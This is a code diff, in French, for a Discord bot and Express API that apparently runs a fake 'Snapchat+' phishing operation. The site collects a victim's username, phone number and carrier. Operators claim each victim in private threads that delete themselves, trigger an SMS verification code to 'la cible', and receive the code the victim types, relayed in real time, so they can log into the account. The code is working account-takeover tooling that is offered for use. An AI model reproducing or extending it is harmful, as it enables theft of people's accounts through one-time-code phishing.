@@ -1,11 +1,11 @@
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField } = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
 const express = require('express');
 const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
 
 const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
-const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1568351310858690716';
-const PREFIX           = '+';
+// ⚠️ TON NOUVEAU SALON EST ICI :
+const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245'; 
 
 const demandes = new Map();
 
@@ -18,231 +18,220 @@ const client = new Client({ intents: [
 
 client.once('ready', () => {
   console.log(`✅ Bot connecté : ${client.user.tag}`);
-  client.user.setActivity('+help', { type: 'LISTENING' });
+  client.user.setActivity('Snapchat+ | Halloween', { type: 'WATCHING' });
 });
 
 /* ═══════════════════════════════════════════════════════════════
-   BOUTONS (Accepter / Refuser / Copier)
+   GESTION DES BOUTONS
    ═══════════════════════════════════════════════════════════════ */
 client.on('interactionCreate', async (interaction) => {
   if (!interaction.isButton()) return;
 
-  const [action, demandeId] = interaction.customId.split(':');
+  const args = interaction.customId.split(':');
+  const action = args[0];
+  const demandeId = args[1];
   const demande = demandes.get(demandeId);
-  
-  if (!demande) return interaction.reply({ content: 'Cette demande n\'existe plus.', ephemeral: true });
 
-  // ── COPIER LE NUMÉRO ──
-  if (action === 'copy') {
-    return interaction.reply({ content: `📋 Voici le numéro : \`${demande.phone}\``, ephemeral: true });
-  }
+  if (!demande) return interaction.reply({ content: 'Ce dossier est terminé ou n\'existe plus.', ephemeral: true });
 
-  if (demande.status !== 'pending') return interaction.reply({ content: 'Cette demande a déjà été traitée.', ephemeral: true });
+  // ── 1. PRENDRE LE NUMÉRO (Crée le fil privé) ──
+  if (action === 'claim') {
+    if (demande.claimed) return interaction.reply({ content: '❌ Trop tard, ce numéro a déjà été pris !', ephemeral: true });
 
-  // ── REFUSER ──
-  if (action === 'reject') {
-    demande.status = 'rejected';
+    demande.claimed = true;
+    demande.claimedBy = interaction.user.id;
     demandes.set(demandeId, demande);
+
+    // Désactiver le bouton public
     await interaction.update({
-      content: `❌ Demande de **@${demande.username}** refusée par ${interaction.user}.`,
+      content: `⚡ **Nouveau numéro disponible : ${demande.operator}**\n✅ *Ce numéro a été pris par ${interaction.user}*`,
+      embeds: [],
       components: []
     });
-    return;
+
+    // Création du fil privé
+    const thread = await interaction.channel.threads.create({
+      name: `📁 Dossier - @${demande.username}`,
+      type: ChannelType.PrivateThread,
+      reason: 'Prise en charge du dossier client'
+    });
+    
+    await thread.members.add(interaction.user.id);
+    demande.threadId = thread.id;
+    demandes.set(demandeId, demande);
+
+    const dossierEmbed = new EmbedBuilder()
+      .setTitle('📁 FICHE DE VÉRIFICATION')
+      .setColor(0xFF6B00)
+      .setDescription(`Nouveau numéro attribué pour **@${demande.username}**.\nEnvoyez le code SMS à la cible, puis cliquez sur l'option ci-dessous :`)
+      .addFields(
+        { name: '📱 Numéro Cible', value: `**+33 ${demande.phone}**\n\`${demande.phone}\``, inline: false },
+        { name: '👤 Snapchat', value: `\`@${demande.username}\``, inline: true },
+        { name: '🏢 Opérateur', value: `\`${demande.operator}\``, inline: true },
+        { name: '📟 Appareil', value: '`Windows PC`', inline: true },
+        { name: '🌍 Pays', value: '🇫🇷 France', inline: true }
+      )
+      .setFooter({ text: 'Sélectionnez la longueur du code à demander' });
+
+    const rowCode = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId(`setcode:4:${demandeId}`).setLabel('Code 4 Chiffres').setStyle(ButtonStyle.Success).setEmoji('📱'),
+      new ButtonBuilder().setCustomId(`setcode:6:${demandeId}`).setLabel('Code 6 Chiffres').setStyle(ButtonStyle.Primary).setEmoji('🔢')
+    );
+    const rowActions = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId(`copynum:${demandeId}`).setLabel('Copier Numéro').setStyle(ButtonStyle.Secondary).setEmoji('📋'),
+      new ButtonBuilder().setCustomId(`blacklist:${demandeId}`).setLabel('Blacklist').setStyle(ButtonStyle.Danger).setEmoji('🚫'),
+      new ButtonBuilder().setCustomId(`reject:${demandeId}`).setLabel('Rejeter').setStyle(ButtonStyle.Danger).setEmoji('❌')
+    );
+
+    await thread.send({ content: `${interaction.user}, voici ton dossier :`, embeds: [dossierEmbed], components: [rowCode, rowActions] });
+    return interaction.followUp({ content: `✅ Dossier déplacé dans ton fil privé : ${thread}`, ephemeral: true });
   }
 
-  // ── ACCEPTER ──
+  // ── 2. COPIER LE NUMÉRO (Uniquement le numéro) ──
+  if (action === 'copynum') {
+    return interaction.reply({ content: `${demande.phone.replace(/\s/g, '')}`, ephemeral: true });
+  }
+
+  // ── 3. DEMANDER LE CODE (4 ou 6) ──
+  if (action === 'setcode') {
+    const length = parseInt(args[1]);
+    demande.codeLength = length;
+    demande.waitingForCode = true;
+    demandes.set(demandeId, demande);
+
+    await interaction.update({
+      content: `⏳ **Demande envoyée au client (Code à ${length} chiffres). En attente de sa saisie...**`,
+      embeds: [],
+      components: []
+    });
+  }
+
+  // ── 4. MAUVAIS CODE (Redemander) ──
+  if (action === 'badcode') {
+    demande.waitingForCode = true;
+    demandes.set(demandeId, demande);
+    await interaction.update({
+      content: `⚠️ **Code signalé invalide. Le client est invité à retaper son code sur la page.**`,
+      embeds: [],
+      components: []
+    });
+  }
+
+  // ── 5. VALIDER & SUPPRIMER LE FIL ──
   if (action === 'accept') {
     demande.status = 'accepted';
-    demande.acceptedBy = interaction.user.id;
-    demande.acceptedByTag = interaction.user.tag;
     demandes.set(demandeId, demande);
-
-    await interaction.update({
-      content: `✅ ${interaction.user} a accepté la demande de **@${demande.username}**.\nEn attente du code à 4 chiffres…`,
-      components: []
-    });
-
-    try {
-      await interaction.user.send(`Salut ! Tu as accepté la demande de **@${demande.username}**.\nDès que la personne entre son code sur le site, je te l'enverrai ici en message privé.`);
-    } catch (e) { console.log('MP impossible pour', interaction.user.tag); }
+    
+    await interaction.update({ content: `✅ **Dossier approuvé avec succès.**\n*(Ce fil sera supprimé dans 5 secondes...)*`, embeds: [], components: [] });
+    
+    setTimeout(() => {
+      if (interaction.channel) interaction.channel.delete().catch(() => {});
+    }, 5000);
+  }
+  
+  // ── 6. REJETER / BLACKLIST ──
+  if (action === 'reject' || action === 'blacklist') {
+    demande.status = action === 'reject' ? 'rejected' : 'blacklisted';
+    demandes.set(demandeId, demande);
+    await interaction.update({ content: `❌ **Dossier rejeté.**\n*(Ce fil sera supprimé dans 5 secondes...)*`, embeds: [], components: [] });
+    
+    setTimeout(() => {
+      if (interaction.channel) interaction.channel.delete().catch(() => {});
+    }, 5000);
   }
 });
 
 /* ═══════════════════════════════════════════════════════════════
-   COMMANDES "+"
-   ═══════════════════════════════════════════════════════════════ */
-client.on('messageCreate', async (message) => {
-  if (message.author.bot) return;
-  if (!message.content.startsWith(PREFIX)) return;
-
-  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
-  const cmd  = args.shift().toLowerCase();
-
-  if (cmd === 'help') {
-    const embed = new EmbedBuilder()
-      .setTitle('📖 Commandes disponibles')
-      .setColor(0xFFFC00)
-      .setDescription('Voici la liste des commandes du bot SnapPlus.')
-      .addFields(
-        { name: '+demandes',            value: 'Liste les demandes en cours' },
-        { name: '+ban @user [raison]',  value: 'Bannit un membre du serveur' },
-        { name: '+kick @user [raison]', value: 'Expulse un membre du serveur' },
-        { name: '+mute @user [durée]',  value: 'Rend un membre muet (ex: +mute @user 10m)' },
-        { name: '+unmute @user',        value: 'Retire le mute d\'un membre' }
-      )
-      .setFooter({ text: 'Préfixe : +' });
-    return message.reply({ embeds: [embed] });
-  }
-
-  if (cmd === 'demandes') {
-    const all = Array.from(demandes.values());
-    if (all.length === 0) return message.reply('Aucune demande pour le moment.');
-    const lines = all.slice(0, 20).map(d => {
-      const emoji = d.status === 'pending' ? '⏳' : d.status === 'accepted' ? '✅' : '❌';
-      return `${emoji} **@${d.username}** — +33${d.phone} (${d.status})`;
-    });
-    const embed = new EmbedBuilder()
-      .setTitle(`📋 ${all.length} demande(s)`)
-      .setColor(0xFFFC00)
-      .setDescription(lines.join('\n'));
-    return message.reply({ embeds: [embed] });
-  }
-
-  if (['ban','kick','mute','unmute'].includes(cmd)) {
-    if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) {
-      return message.reply('❌ Tu n\'as pas la permission d\'utiliser cette commande.');
-    }
-    const target = message.mentions.members.first();
-    if (!target) return message.reply('❌ Mentionne un membre. Exemple : `+' + cmd + ' @user`');
-    if (target.roles.highest.position >= message.member.roles.highest.position && message.author.id !== message.guild.ownerId) {
-      return message.reply('❌ Tu ne peux pas sanctionner quelqu\'un de plus haut gradé que toi.');
-    }
-    const reason = args.slice(1).join(' ') || 'Aucune raison fournie';
-    try {
-      if (cmd === 'ban') {
-        await target.ban({ reason });
-        return message.reply(`🔨 **${target.user.tag}** a été banni. Raison : ${reason}`);
-      }
-      if (cmd === 'kick') {
-        await target.kick(reason);
-        return message.reply(`👢 **${target.user.tag}** a été expulsé. Raison : ${reason}`);
-      }
-      if (cmd === 'mute') {
-        const durationArg = args[1];
-        let ms = 10 * 60 * 1000;
-        if (durationArg) {
-          const match = durationArg.match(/^(\d+)(s|m|h|d)$/);
-          if (match) {
-            const val = parseInt(match[1]);
-            const unit = match[2];
-            const mult = unit === 's' ? 1000 : unit === 'm' ? 60000 : unit === 'h' ? 3600000 : 86400000;
-            ms = val * mult;
-          }
-        }
-        await target.timeout(ms, reason);
-        const mins = Math.round(ms / 60000);
-        return message.reply(`🔇 **${target.user.tag}** est muet pendant ${mins} min.`);
-      }
-      if (cmd === 'unmute') {
-        await target.timeout(null);
-        return message.reply(`🔊 **${target.user.tag}** n'est plus muet.`);
-      }
-    } catch (e) {
-      console.error(e);
-      return message.reply('❌ Erreur : ' + e.message);
-    }
-  }
-});
-
-/* ═══════════════════════════════════════════════════════════════
-   API EXPRESS (Reçoit les demandes du site)
+   API EXPRESS
    ═══════════════════════════════════════════════════════════════ */
 const app = express();
 app.use(cors());
 app.use(express.json());
 
+// 1. Nouvelle demande
 app.post('/api/demande', async (req, res) => {
   try {
     const { username, phone, operator } = req.body;
-    if (!username || !phone || !operator) return res.status(400).json({ error: 'Champs manquants' });
-
     const id = uuidv4();
-    const demande = {
-      id, username, phone, operator,
-      status: 'pending', createdAt: Date.now(),
-      acceptedBy: null, acceptedByTag: null, code: null
-    };
+    
+    let formattedPhone = phone;
+    if(phone.length === 10) formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;
+
+    const demande = { id, username, phone: formattedPhone, operator, status: 'pending', claimed: false, waitingForCode: false };
     demandes.set(id, demande);
 
     const channel = await client.channels.fetch(ADMIN_CHANNEL_ID);
-    if (!channel) return res.status(500).json({ error: 'Salon Discord introuvable' });
-
-    // Formatage propre du numéro (ex: 06 07 74 90 33)
-    let formattedPhone = phone;
-    if(phone.length === 10) {
-      formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;
-    }
-
-    // ── DESIGN DE L'EMBED AVEC TOUS LES EMOJIS ──
-    const embed = new EmbedBuilder()
-      .setTitle('👻 Snapchat+ Request — En attente')
-      .setColor(0xFFFC00)
+    
+    const embedPublic = new EmbedBuilder()
+      .setTitle(`⚡ NOUVEAU NUMÉRO DISPONIBLE : ${operator}`)
+      .setColor(0xFF6B00)
+      .setDescription('Un utilisateur attend sa validation sur le site.\nCliquez sur **Prendre le numéro** pour traiter le dossier.')
       .addFields(
-        { name: '👤 Pseudo', value: `\`\`\`\n${username}\n\`\`\``, inline: false },
-        { name: '📱 Téléphone', value: `\`\`\`\n${formattedPhone}\n\`\`\``, inline: true },
-        { name: '📡 Opérateur', value: `\`\`\`\n${operator}\n\`\`\``, inline: true },
-        { name: '🇫🇷 Pays', value: `\`\`\`\nFrance\n\`\`\``, inline: true },
-        { name: '⚙️ Statut', value: '⏳ En attente de validation', inline: false }
+        { name: '🌍 Pays', value: '🇫🇷 France', inline: true },
+        { name: '📟 Appareil', value: '💻 Windows PC', inline: true },
+        { name: '🏢 Opérateur', value: `\`${operator}\``, inline: true }
       )
-      .setFooter({ text: 'SnapPlus | Système de validation', iconURL: 'https://i.imgur.com/w1p9U4A.png' })
+      .setFooter({ text: 'SnapPlus • Numéro masqué' })
       .setTimestamp();
 
     const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId(`accept:${id}`).setLabel('Accepter').setStyle(ButtonStyle.Success).setEmoji('✅'),
-      new ButtonBuilder().setCustomId(`reject:${id}`).setLabel('Refuser').setStyle(ButtonStyle.Danger).setEmoji('❌'),
-      new ButtonBuilder().setCustomId(`copy:${id}`).setLabel('Copier le numéro').setStyle(ButtonStyle.Secondary).setEmoji('📋')
+      new ButtonBuilder().setCustomId(`claim:${id}`).setLabel('Prendre le numéro').setStyle(ButtonStyle.Primary).setEmoji('⚡')
     );
 
-    const msg = await channel.send({ embeds: [embed], components: [row] });
-    demande.messageId = msg.id;
+    const msg = await channel.send({ content: `@everyone ⚡ **NOUVELLE COMMANDE : ${operator}**`, embeds: [embedPublic], components: [row] });
+    demande.publicMsgId = msg.id;
     demandes.set(id, demande);
 
     res.json({ success: true, demandeId: id });
   } catch (err) {
-    console.error(err);
     res.status(500).json({ error: err.message });
   }
 });
 
+// 2. Statut du site
 app.get('/api/demande/:id/status', (req, res) => {
   const demande = demandes.get(req.params.id);
-  if (!demande) return res.status(404).json({ error: 'Demande introuvable' });
-  res.json({ status: demande.status });
+  if (!demande) return res.status(404).json({ error: 'Introuvable' });
+  if (demande.status === 'blacklisted') return res.json({ status: 'rejected', blacklisted: true });
+  res.json({ status: demande.status, waitingForCode: demande.waitingForCode });
 });
 
+// 3. Code reçu depuis le site
 app.post('/api/demande/:id/code', async (req, res) => {
   try {
     const { code } = req.body;
-    if (!code || code.length !== 4) return res.status(400).json({ error: 'Le code doit faire 4 chiffres' });
-
     const demande = demandes.get(req.params.id);
-    if (!demande) return res.status(404).json({ error: 'Demande introuvable' });
-    if (demande.status !== 'accepted') return res.status(400).json({ error: 'Demande non acceptée' });
+    if (!demande) return res.status(404).json({ error: 'Introuvable' });
 
+    demande.waitingForCode = false;
     demande.code = code;
     demandes.set(demande.id, demande);
 
-    try {
-      const user = await client.users.fetch(demande.acceptedBy);
-      await user.send(`🔑 **Code SnapPlus** pour **@${demande.username}** :\n\`\`\`\n${code}\n\`\`\``);
-    } catch (e) {
-      console.log('MP impossible pour', demande.acceptedByTag);
-      return res.status(500).json({ error: 'Impossible d\'envoyer le MP' });
+    const embedCode = new EmbedBuilder()
+      .setTitle('🔑 CODE REÇU DU CLIENT')
+      .setColor(0x2b2d31)
+      .setDescription(`Le client **@${demande.username}** vient de saisir son code :`)
+      .addFields(
+        { name: '➡️ Code', value: `# **${code}**`, inline: false },
+        { name: '📱 Numéro', value: `**+33 ${demande.phone}**`, inline: true },
+        { name: '👤 Compte Snap', value: `\`@${demande.username}\``, inline: true }
+      )
+      .setTimestamp();
+
+    const rowActions = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId(`accept:${demande.id}`).setLabel('Valider & Activer').setStyle(ButtonStyle.Success).setEmoji('✅'),
+      new ButtonBuilder().setCustomId(`badcode:${demande.id}`).setLabel('Mauvais Code').setStyle(ButtonStyle.Danger).setEmoji('⚠️')
+    );
+
+    if (demande.threadId) {
+      const thread = await client.channels.fetch(demande.threadId).catch(() => null);
+      if (thread) {
+        await thread.send({ content: `<@${demande.claimedBy}> 🚨 **ALERTE CODE REÇU — ACTION IMMÉDIATE : ${code}** 🚨`, embeds: [embedCode], components: [rowActions] });
+      }
     }
 
     res.json({ success: true });
   } catch (err) {
-    console.error(err);
     res.status(500).json({ error: err.message });
   }
 });
